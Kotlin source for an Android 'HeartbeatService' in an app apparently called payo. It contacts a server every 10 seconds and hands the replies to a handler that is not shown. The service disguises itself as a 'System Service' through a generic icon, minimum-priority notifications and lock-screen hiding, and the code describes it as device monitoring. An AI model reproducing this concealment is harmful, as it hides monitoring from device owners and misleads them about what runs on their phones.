package com.microspace.payo.services.heartbeat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.microspace.payo.data.DeviceIdProvider
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean

/**
 * HeartbeatService - Simplified Background Service (Silent)
 */
class HeartbeatService : Service() {
    
    companion object {
        private const val TAG = "HeartbeatService"
        private const val NOTIFICATION_ID = 1003
        private const val CHANNEL_ID = "heartbeat_channel_v2"
        private const val HEARTBEAT_INTERVAL_MS = 10_000L  // 10 SECONDS
        
        fun start(context: Context, deviceId: String? = null) {
            val intent = Intent(context, HeartbeatService::class.java)
            if (deviceId != null) intent.putExtra("device_id", deviceId)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        fun stop(context: Context) {
            context.stopService(Intent(context, HeartbeatService::class.java))
        }
    }
    
    private val handler = Handler(Looper.getMainLooper())
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var heartbeatManager: HeartbeatManager
    private lateinit var responseHandler: HeartbeatResponseHandler_v2
    private var heartbeatRunnable: Runnable? = null
    private val isRunning = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()
        heartbeatManager = HeartbeatManager(this)
        responseHandler = HeartbeatResponseHandler_v2(this)
        createNotificationChannel()
        
        // Start foreground immediately with a silent notification
        val notification = createNotification("System process is running")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = intent?.getStringExtra("device_id") ?: DeviceIdProvider.getDeviceId(this)
        
        if (deviceId.isNullOrBlank()) {
            Log.e(TAG, "âŒ Device ID not found. Stopping HeartbeatService.")
            stopSelf()
            return START_NOT_STICKY
        }

        if (!isRunning.getAndSet(true)) {
            Log.i(TAG, "ðŸš€ Heartbeat Loop Started for: $deviceId")
            startHeartbeatLoop()
        }
        
        return START_STICKY
    }
    
    private fun startHeartbeatLoop() {
        heartbeatRunnable = object : Runnable {
            override fun run() {
                if (!isRunning.get()) return
                
                serviceScope.launch {
                    try {
                        val response = heartbeatManager.sendHeartbeat()
                        if (response != null) {
                            responseHandler.handle(response)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Loop Error: ${e.message}")
                    }
                }
                handler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
            }
        }
        handler.post(heartbeatRunnable!!)
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Use IMPORTANCE_MIN to make it silent and not appear in the status bar.
            val channel = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN)
            channel.description = "Essential background service for device monitoring."
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.setShowBadge(false)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(content: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.stat_sys_download_done) // A more generic icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
            .setOngoing(true)
            .build()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        isRunning.set(false)
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        serviceScope.cancel()
        super.onDestroy()
    }
}




